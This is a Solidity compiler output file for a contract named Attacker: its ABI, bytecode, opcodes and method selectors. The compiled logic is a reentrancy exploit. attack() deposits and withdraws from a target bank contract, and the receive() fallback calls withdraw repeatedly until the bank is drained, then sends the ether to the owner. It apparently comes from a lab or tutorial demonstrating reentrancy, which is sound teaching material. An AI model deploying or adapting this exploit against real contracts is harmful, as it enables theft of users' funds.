{
  "contracts/Attacker.sol": {
    "Attacker": {
      "abi": [
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "bankContractAddress",
              "type": "address"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "previousOwner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "OwnershipTransferred",
          "type": "event"
        },
        {
          "inputs": [],
          "name": "attack",
          "outputs": [],
          "stateMutability": "payable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "bankContract",
          "outputs": [
            {
              "internalType": "contract IBank",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "owner",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "renounceOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "transferOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "stateMutability": "payable",
          "type": "receive"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60a060405234801561001057600080fd5b50604051610a80380380610a808339818101604052810190610032919061016c565b61004e61004361008b60201b60201c565b61009360201b60201c565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b81525050506101de565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600081519050610166816101c7565b92915050565b60006020828403121561017e57600080fd5b600061018c84828501610157565b91505092915050565b60006101a0826101a7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101d081610195565b81146101db57600080fd5b50565b60805160601c61086a610216600039600081816057015281816095015281816102390152818161036101526103e2015261086a6000f3fe60806040526004361061004e5760003560e01c806307c2e4491461016e578063715018a6146101995780638da5cb5b146101b05780639e5faafc146101db578063f2fde38b146101e557610169565b366101695760007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610118577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b50505050610167565b61012061020e565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610165573d6000803e3d6000fd5b505b005b600080fd5b34801561017a57600080fd5b50610183610237565b60405161019091906106e3565b60405180910390f35b3480156101a557600080fd5b506101ae61025b565b005b3480156101bc57600080fd5b506101c561020e565b6040516101d291906106c8565b60405180910390f35b6101e36102e3565b005b3480156101f157600080fd5b5061020c6004803603810190610207919061063b565b610462565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b7f000000000000000000000000000000000000000000000000000000000000000081565b61026361055a565b73ffffffffffffffffffffffffffffffffffffffff1661028161020e565b73ffffffffffffffffffffffffffffffffffffffff16146102d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102ce9061071e565b60405180910390fd5b6102e16000610562565b565b6102eb61055a565b73ffffffffffffffffffffffffffffffffffffffff1661030961020e565b73ffffffffffffffffffffffffffffffffffffffff161461035f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103569061071e565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103c757600080fd5b505af11580156103db573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561044857600080fd5b505af115801561045c573d6000803e3d6000fd5b50505050565b61046a61055a565b73ffffffffffffffffffffffffffffffffffffffff1661048861020e565b73ffffffffffffffffffffffffffffffffffffffff16146104de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104d59061071e565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561054e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610545906106fe565b60405180910390fd5b61055781610562565b50565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b6000813590506106358161081d565b92915050565b60006020828403121561064d57600080fd5b600061065b84828501610626565b91505092915050565b61066d8161074f565b82525050565b61067c81610781565b82525050565b600061068f60268361073e565b915061069a826107a5565b604082019050919050565b60006106b260208361073e565b91506106bd826107f4565b602082019050919050565b60006020820190506106dd6000830184610664565b92915050565b60006020820190506106f86000830184610673565b92915050565b6000602082019050818103600083015261071781610682565b9050919050565b60006020820190508181036000830152610737816106a5565b9050919050565b600082825260208201905092915050565b600061075a82610761565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061078c82610793565b9050919050565b600061079e82610761565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6108268161074f565b811461083157600080fd5b5056fea26469706673582212204aa50f869d025ad1401a7fc6fe955c3b4c810c91784a8f9d5cd8b6dbdd5fcaec64736f6c63430008040033",
          "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xA80 CODESIZE SUB DUP1 PUSH2 0xA80 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x16C JUMP JUMPDEST PUSH2 0x4E PUSH2 0x43 PUSH2 0x8B PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH2 0x93 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP POP POP PUSH2 0x1DE JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x166 DUP2 PUSH2 0x1C7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x17E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x18C DUP5 DUP3 DUP6 ADD PUSH2 0x157 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A0 DUP3 PUSH2 0x1A7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1D0 DUP2 PUSH2 0x195 JUMP JUMPDEST DUP2 EQ PUSH2 0x1DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x86A PUSH2 0x216 PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH1 0x57 ADD MSTORE DUP2 DUP2 PUSH1 0x95 ADD MSTORE DUP2 DUP2 PUSH2 0x239 ADD MSTORE DUP2 DUP2 PUSH2 0x361 ADD MSTORE PUSH2 0x3E2 ADD MSTORE PUSH2 0x86A PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7C2E449 EQ PUSH2 0x16E JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x199 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1B0 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1DB JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x1E5 JUMPI PUSH2 0x169 JUMP JUMPDEST CALLDATASIZE PUSH2 0x169 JUMPI PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x118 JUMPI PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x167 JUMP JUMPDEST PUSH2 0x120 PUSH2 0x20E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x165 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x17A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x183 PUSH2 0x237 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x190 SWAP2 SWAP1 PUSH2 0x6E3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1A5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1AE PUSH2 0x25B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C5 PUSH2 0x20E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D2 SWAP2 SWAP1 PUSH2 0x6C8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E3 PUSH2 0x2E3 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x20C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x207 SWAP2 SWAP1 PUSH2 0x63B JUMP JUMPDEST PUSH2 0x462 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0x0 DUP2 JUMP JUMPDEST PUSH2 0x263 PUSH2 0x55A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x281 PUSH2 0x20E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x2D7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2CE SWAP1 PUSH2 0x71E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x2E1 PUSH1 0x0 PUSH2 0x562 JUMP JUMPDEST JUMP JUMPDEST PUSH2 0x2EB PUSH2 0x55A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x309 PUSH2 0x20E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x35F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x356 SWAP1 PUSH2 0x71E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x448 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x45C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x46A PUSH2 0x55A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x488 PUSH2 0x20E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x4DE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4D5 SWAP1 PUSH2 0x71E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x54E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x545 SWAP1 PUSH2 0x6FE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x557 DUP2 PUSH2 0x562 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x635 DUP2 PUSH2 0x81D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x64D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x65B DUP5 DUP3 DUP6 ADD PUSH2 0x626 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x66D DUP2 PUSH2 0x74F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x67C DUP2 PUSH2 0x781 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x68F PUSH1 0x26 DUP4 PUSH2 0x73E JUMP JUMPDEST SWAP2 POP PUSH2 0x69A DUP3 PUSH2 0x7A5 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6B2 PUSH1 0x20 DUP4 PUSH2 0x73E JUMP JUMPDEST SWAP2 POP PUSH2 0x6BD DUP3 PUSH2 0x7F4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6DD PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x664 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6F8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x673 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x717 DUP2 PUSH2 0x682 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x737 DUP2 PUSH2 0x6A5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x75A DUP3 PUSH2 0x761 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x78C DUP3 PUSH2 0x793 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x79E DUP3 PUSH2 0x761 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6464726573730000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x826 DUP2 PUSH2 0x74F JUMP JUMPDEST DUP2 EQ PUSH2 0x831 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4A 0xA5 0xF DUP7 SWAP14 MUL GAS 0xD1 BLOCKHASH BYTE PUSH32 0xC6FE955C3B4C810C91784A8F9D5CD8B6DBDD5FCAEC64736F6C63430008040033 "
        },
        "methodIdentifiers": {
          "attack()": "9e5faafc",
          "bankContract()": "07c2e449",
          "owner()": "8da5cb5b",
          "renounceOwnership()": "715018a6",
          "transferOwnership(address)": "f2fde38b"
        }
      }
    }
  }
}